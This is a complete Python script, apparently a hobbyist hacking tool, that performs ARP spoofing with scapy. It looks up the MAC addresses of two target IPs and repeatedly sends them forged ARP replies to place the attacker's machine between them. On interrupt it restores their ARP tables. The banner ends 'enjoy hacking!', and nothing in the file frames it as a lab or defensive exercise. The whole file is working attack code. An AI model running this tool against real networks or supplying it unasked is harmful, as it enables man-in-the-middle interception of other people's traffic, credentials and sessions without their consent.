#!/usr/bin/python3
import scapy.all as scapy
from time import sleep
import argparse, re

def intro(targets):
    "give an introduction"
    print("*"*50)
    print("Tool: ARP spoofer tool.")
    print("Author: ArimaGH")
    print(f"targets: {targets[0]} and {targets[1]}")
    print("enjoy hacking!")
    print("*"*50)

def ipRegexp(string):
    ip = re.search(r'^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)(\.(?!$)|$)){4}$', string)
    return ip

def parseArguments():
    "parse arguments"
    parser = argparse.ArgumentParser()
    parser.add_argument('--targets', '-t', help="a list of targets. please separate the two IP addresses by commas: 192.168.x.x,192.168.x.x.", dest="targets", required=True)
    targetsString = parser.parse_args().targets
    targetsList = targetsString.split(',')
    checkArguments(targetsList)
    return targetsList

def checkArguments(targetsList):
    if len(targetsList) != 2:
        print('[-] you should provide two IP addresses.')
        exit(1)
    if ipRegexp(targetsList[0]) == None or ipRegexp(targetsList[1]) == None:
        print('[-] enter valid IP addresses.')
        exit(1)
    if targetsList[0] == targetsList[1]:
        print('[-] the targets must be different.')
        exit(1)

def getMAC(ip):
    "get the MAC address of a given IP"
    ARPPacket = scapy.ARP(pdst=ip);
    etherPacket = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    etherARP = etherPacket/ARPPacket
    answer = scapy.srp(etherARP, verbose=False, timeout=1)[0]
    return answer[0][1].hwdst

def sendARPResponse(targetIP, sourceIP):
    "send an ARP response, fooling the target"
    targetMAC = getMAC(targetIP)
    ARPPacket = scapy.ARP(pdst=targetIP, psrc=sourceIP, hwdst=targetMAC, op=2, )
    scapy.send(ARPPacket, verbose=False)

def restoreARPTable(sourceIP, destinationIP):
    "restore ARP table back to normal"
    sourceMAC = getMAC(sourceIP)
    destinationMAC = getMAC(destinationIP)
    ARPPacket = scapy.ARP(pdst=destinationIP, hwdst=destinationMAC, psrc=sourceIP, hwsrc=sourceMAC, op=2)
    scapy.send(ARPPacket, verbose=False)

targetsList = parseArguments()

intro(targetsList)

packetsSent = 0

while True:
    try:
        sendARPResponse(targetsList[0],targetsList[1])
        sendARPResponse(targetsList[1], targetsList[0])
        packetsSent += 2
        print(f'\r[+] {packetsSent} packets sent', end="")
        sleep(2)
    except KeyboardInterrupt:
        print("[+] detected keyboard interrupt, restoring arp tables..")
        restoreARPTable(targetsList[0], targetsList[1])
        restoreARPTable(targetsList[1], targetsList[0])
        print('[+] everything back to normal, quitting..')
        exit(0)
